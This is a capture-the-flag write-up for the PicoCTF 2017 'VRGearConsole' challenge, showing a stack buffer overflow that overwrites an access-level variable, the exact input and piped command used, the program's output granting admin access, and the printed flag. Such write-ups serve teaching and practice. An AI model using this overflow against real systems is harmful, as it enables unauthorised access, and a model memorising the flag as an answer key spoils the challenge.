# PicoCTF_2017: VRGearConsole

**Category:** Binary Exploitation
**Points:** 95
**Description:**

>Here's the [VR gear admin console](vrgearconsole.c). See if you can figure out a way to log in. The problem is found here: /problems/1e50bd93be07ea1bca65a1a071e18eef

**Hint:**

>What happens if you read in more characters than the length of the username buffer?
You should look at an ascii table to see what character you need to choose.
Numbers are stored in little-endian format, which means that the lowest byte of the number is first.
"cat file - | vrgearconsole " will keep the pipe open for commands.

## Write-up
Looking at the source code, we see a gaping hole for buffer overflow.

    int accessLevel = 0xff;
    char username[16];
    char password[32];

So, to buffer overflow this, we need to fill up username past it's limits to overwrite accessLevel. One way to do that, is by simply sending `17` characters.

    $ echo "AAAAAAAAAAAAAAAA!" > ~/file
    $ cat ~/file - | ./vrgearconsole 
    +----------------------------------------+
    |                                        |
    |                                        |
    |                                        |
    |                                        |
    |  Welcome to the VR gear admin console  |
    |                                        |
    |                                        |
    |                                        |
    |                                        |
    +----------------------------------------+
    |                                        |
    |      Your account is not recognized    |
    |                                        |
    +----------------------------------------+




    Please login to continue...


    Username (max 15 characters): Password (max 31 characters):
    Your access level is: 0x00000021
    Admin access granted!
    The flag is in "flag.txt".
    cat flag.txt
    5a9aeea545615089851dd6a9b57a3139

Therefore, the flag is `5a9aeea545615089851dd6a9b57a3139`.